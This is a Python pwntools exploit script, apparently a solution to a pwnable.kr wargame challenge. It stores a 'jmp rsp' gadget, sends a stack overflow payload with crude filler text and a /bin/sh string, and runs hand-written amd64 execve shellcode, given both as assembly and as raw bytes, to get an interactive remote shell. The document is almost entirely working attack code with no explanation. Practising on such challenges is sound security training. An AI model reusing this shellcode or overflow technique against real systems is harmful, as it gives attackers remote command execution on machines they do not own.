#!/usr/bin/env python3
from pwn import *
context(arch = 'amd64', os = 'linux')

def SendLine(process, s):
    process.sendline(s)
    print(s)

sys_execve = 59
addr_id = 0x00000000006020A0

try:
    jumper = asm('jmp rsp')
    shellcode = asm('xor rsi, rsi') + \
                asm('xor rdx, rdx') + \
                asm('sub rsp, 0x10') + \
                asm('mov rdi, rsp') + \
                asm('mov rax, ' + hex(sys_execve)) + \
                asm('syscall')
except:
    jumper = b'\xff\xe4'
    shellcode = b'\x48\x31\xf6' \
                b'\x48\x31\xd2' \
                b'\x48\x83\xec\x10' \
                b'\x48\x89\xe7' \
                b'\x48\xc7\xc0\x3b\x00\x00\x00' \
                b'\x0f\x05'

payload = b'fuckfuck' * 4 + b'/bin/sh\x00' + pack(addr_id, 64) + shellcode

p = remote('pwnable.kr', 9010)
print(p.recv().decode(), end = '')
SendLine(p, jumper)
print(p.recv().decode(), end = '')
SendLine(p, '1')
print(p.recv())
SendLine(p, payload)

p.interactive()
